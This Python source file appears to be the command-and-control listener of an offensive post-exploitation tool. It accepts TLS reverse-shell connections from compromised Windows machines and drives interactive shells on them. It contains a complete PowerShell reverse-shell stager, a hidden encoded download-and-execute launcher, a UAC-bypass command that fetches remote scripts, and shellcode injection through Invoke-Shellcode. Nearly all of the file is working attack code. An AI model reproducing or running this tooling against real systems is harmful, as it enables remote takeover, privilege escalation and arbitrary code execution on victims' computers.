#!/usr/bin/python
import socket
import ssl
import random
import re
import sys
import os
import time
import select
from threading import Thread
from main import *
from menu import *

def startBindListener(portnum,useProxy):
    try:
        bs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        bssl = ssl.wrap_socket(bs, ssl_version=ssl.PROTOCOL_TLSv1, ciphers="AES256", certfile="server.crt", keyfile="server.key", server_side=True)
        bssl.bind((FUNCTIONS().CheckInternet(), portnum))
        bssl.listen(1)

        if useProxy:
            bsp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            bsp.bind(('127.0.0.1', 8888))
            bsp.listen(1)

    except:
        print t.bold_red + "[*] Error with listener - Port in use" + t.normal

    print t.bold_red + "listening on port %s"%portnum + t.normal

    bindClient, bindAddress = bssl.accept()
    bindIp, bindPort = bindAddress
    print t.bold_green + "connection from %s %s"%(bindIp, bindPort) + t.normal

    if useProxy:
        subprocess.Popen(['firefox','127.0.0.1:8888'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        bindServer, bindServerAddress = bsp.accept()

    while bindClient:
        try:
            bindData = bindClient.recv(8000)
            if useProxy:
                bindServer.sendall(bindData)
                continue
            else:
                print bindData
        except:
            print t.bold_red + "connection closed from %s %s"%(bindIp, bindPort) + t.normal
            break

    if useProxy:
        bsp.close()
    bssl.close()


def startClientListener():
    time.sleep(0.25)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ws = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1, ciphers="AES256", certfile="server.crt", keyfile="server.key", server_side=True)
    except:
        sys.stdout.write('\r' + t.bold_red + "[*] Error with listener - Rerun ./setup.py to generate certs" + t.normal)
        sys.stdout.flush()
        sys.exit(1)
    try:
        ws.bind((FUNCTIONS().CheckInternet(), 5555))
        ws.listen(30)
    except:
        sys.stdout.write('\r' + t.bold_red + "[*] Error with listener - Port in use" + t.normal)
        sys.stdout.flush()
        sys.exit(1)

    sys.stdout.write('\r' + t.bold_red + "listening on port 5555" + t.normal + t.bold_yellow + '\nMain Menu' + t.normal + ' > ')
    sys.stdout.flush()
    clientnumber = 0

    while True:
        clientconn, address = ws.accept()
        ip , port = address

        if clientconn:
            clientnumber += 1
            sys.stdout.write('\r' + t.bold_green + "connection from %s %s"%(ip,port) + t.normal)
            sys.stdout.flush()

            worker = Thread(target=pingClients, args=(clientconn,clientnumber))
            worker.setDaemon(True)
            worker.start()

        from menu import clientMenuOptions
        clientMenuOptions[str(clientnumber)] =  {'payloadchoice': None, 'payload':ip + ":" + str(port), 'extrawork': interactShell, 'params': (clientconn,clientnumber)}

    ws.close()


def interactShell(clientconn,clientnumber):
    computerName = ""
    from menu import clientMenuOptions
    print "Commands\n" + "-"*50 + "\nback - Background Shell\nexit - Close Connection\nuacbypass - UacBypass To Open New Admin Connection\n" + "-"*50
    while True:
        while clientconn in select.select([clientconn], [], [], 0.1)[0]:
            computerName += clientconn.recv(2048)
            if len(computerName) > 1:
                print t.bold_yellow + computerName + t.normal

        command = raw_input(" ")
        if command.lower() == "back":
            break
        elif command.lower() == "uacbypass":
            clientconn.sendall("IEX (New-Object Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/master/Invoke-EventVwrBypass.ps1\");Invoke-EventVwrBypass -Command \"powershell.exe -c IEX (New-Object Net.Webclient).DownloadString('http://" + FUNCTIONS().CheckInternet() + ":" + str(randoStagerDLPort) + "/" + "p.ps1" + "')\"")
        elif command == "":
            clientconn.sendall("\n")
        elif command.lower() == "exit":
            if str(clientnumber) in clientMenuOptions.keys():
                print t.bold_red + "Client %s Connection Killed"% clientnumber + t.normal
                del clientMenuOptions[str(clientnumber)]
                clientconn.close()
                time.sleep(2)
            break
        else:
            clientconn.sendall(command)

        while True:
            data = clientconn.recv(1).rstrip('\r')
            sys.stdout.write(data)
            sys.stdout.flush()
            if data == "\x00":
                break
    return "clear"


def clientUpload(fileToUpload,clientconn,powershellExec,isExe):
    if powershellExec:
        if isExe:
            newpayloadlayout = FUNCTIONS().powershellShellcodeLayout(powershellExec)
            encPowershell = "IEX (New-Object Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/raw/master/CodeExecution/Invoke-Shellcode.ps1');Start-Sleep 20;Invoke-Shellcode -Force -Shellcode @(%s)"%newpayloadlayout.rstrip(',')
            encPowershell = base64.b64encode(encPowershell.encode('utf_16_le'))
            powershellExec = "$Arch = (Get-Process -Id $PID).StartInfo.EnvironmentVariables['PROCESSOR_ARCHITECTURE'];if ($Arch -eq 'x86') {powershell -exec bypass -enc \"%s\"}elseif ($Arch -eq 'amd64'){$powershell86 = $env:windir + '\SysWOW64\WindowsPowerShell\\v1.0\powershell.exe';& $powershell86 -exec bypass -enc \"%s\"}"%(encPowershell,encPowershell)

        clientconn.sendall(powershellExec)

def printListener():
    windows_powershell_stager = (
        "cd ($env:SystemDrive + '\\');"
        "$c = New-Object System.Net.Sockets.TCPClient('" + FUNCTIONS().CheckInternet() + "','" + str(5555) + "');"
        "$b = New-Object Byte[] $c.ReceiveBufferSize;"
        "$sl = New-Object System.Net.Security.SslStream $c.GetStream(),$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]);"
        "$sl.AuthenticateAsClient($env:computername);"
        "if ((New-Object Security.Principal.WindowsPrincipal ([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)){$ia = 'Admin: True'}else{$ia = 'Admin: False'};"
        "$h = \"ComputerName: \" + ($env:computername) + \"\n\" +$ia ;$he = ([text.encoding]::ASCII).GetBytes($h);$sl.Write($he,0,$he.Length);"
        "while(1){"
        "try{$i = $sl.Read($b, 0, $b.Length)}catch{exit};"
        "if ($i -lt 1){exit};"
        "$sb = New-Object -TypeName System.Text.ASCIIEncoding; $d = $sb.GetString($b,0, $i).replace(\"`0\",\"\");"
        "if ($d.Length -gt 0){$cb = (iex -c $d 2>&1 | Out-String);"
        "$br = $cb + ($error[0] | Out-String) + 'PS ' + (Get-Location).Path + '>' + \"`0\";$error.clear();"
        "$sb = ([text.encoding]::ASCII).GetBytes($br);$sl.Write($sb,0,$sb.Length);"
        "$sl.Flush()}}")

    powershellFileName = 'p.ps1'
    with open((payloaddir()+ '/' + powershellFileName), 'w') as powershellStagerFile:
        powershellStagerFile.write(windows_powershell_stager)
        powershellStagerFile.close()
    global randoStagerDLPort # need to fix asap. Globals are shit fam
    randoStagerDLPort = random.randint(5000,9000)
    FUNCTIONS().DoServe(FUNCTIONS().CheckInternet(), powershellFileName, payloaddir(), port=randoStagerDLPort, printIt = False)
    print 'powershell -w hidden -noni -enc ' + ("IEX (New-Object Net.Webclient).DownloadString('http://" + FUNCTIONS().CheckInternet() + ":" + str(randoStagerDLPort) + "/" + powershellFileName + "')").encode('utf_16_le').encode('base64').replace('\n','')
    return "pass"

def pingClients(clientconn,clientnumber):
    from menu import clientMenuOptions

    try:
        while True:
            time.sleep(15)
            clientconn.sendall('\x00')
    except:
        if str(clientnumber) in clientMenuOptions.keys():
            print t.bold_red + "Client %s Has Disconnected" % clientnumber + t.normal
            del clientMenuOptions[str(clientnumber)]

        sys.exit(1)
